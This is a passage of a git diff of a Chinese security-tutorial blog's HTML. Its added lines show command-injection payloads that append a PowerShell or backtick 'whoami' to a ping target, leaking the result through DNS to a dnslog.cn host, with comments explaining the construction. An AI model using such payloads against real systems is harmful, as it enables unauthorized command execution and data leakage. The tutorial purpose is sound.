+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">127.0.0.1|powershell$x=whoami;$x=$x.Replace(&#39;\&#39;,&#39;xxx&#39;);$y=&#39;.f4an93.dnslog.cn&#39;;$z=$x+$ y;ping $z
+</span></span><span class="line"><span class="cl">//为什么要这样写
+</span></span><span class="line"><span class="cl">//首先cmd无法执行whoami
+</span></span><span class="line"><span class="cl">//所以用到powershell变量赋值 把whoami执行结果给变量
+</span></span><span class="line"><span class="cl">//结果带有“\〞导致ping无法执行
+</span></span><span class="line"><span class="cl">//所以Replace(&#39;\&#39;,&#39;xxx&#39;)，用xxx代替\
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>若为Linux则：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> ping &#39;whoami&#39;.f4an93.dnslog.cn
+</span></span><span class="line"><span class="cl"> //Windows服务器不能这样因为windows不支持&#39;&#39;命令
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 </ul>
 
 </section>
@@ -511,23 +769,23 @@ Web App软件开发简单地说，就是开发一个网站，然后加入app的�
             
                 
 <article class="has-image">
-    <a href="/p/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E5%8F%8D%E5%BC%B9shell%E4%B8%8E%E5%B8%A6%E5%A4%96%E6%9F%A5%E8%AF%A2/">
+    <a href="/p/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8app%E5%BA%94%E7%94%A8%E4%B8%8E%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%BA%94%E7%94%A8/">
         
         
             <div class="article-image">
-                <img src="/p/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E5%8F%8D%E5%BC%B9shell%E4%B8%8E%E5%B8%A6%E5%A4%96%E6%9F%A5%E8%AF%A2/xh.9fca6c7c2b5c207b933a6e58bff5e063_hu_eae66487ece7d2ef.jpg" 
+                <img src="/p/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8app%E5%BA%94%E7%94%A8%E4%B8%8E%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%BA%94%E7%94%A8/zly2.df9814b7eabd2c55f913ea0b8e3544f5_hu_8cf59716da6dceb.jpg" 
                         width="250" 
                         height="150" 
                         loading="lazy"
-                        alt="Featured image of post 基础入门反弹SHELL与带外查询"
+                        alt="Featured image of post 基础入门app应用与微信小程序应用"
                         
-                        data-hash="md5-n8psfCtcIHuTOm5Yv/XgYw==">
+                        data-hash="md5-35gUt&#43;q9LFX5E&#43;oLjjVE9Q==">
                 
             </div>
         
 
         <div class="article-details">
-            <h2 class="article-title">基础入门反弹SHELL与带外查询</h2>
+            <h2 class="article-title">基础入门app应用与微信小程序应用</h2>
         </div>
     </a>
 </article>
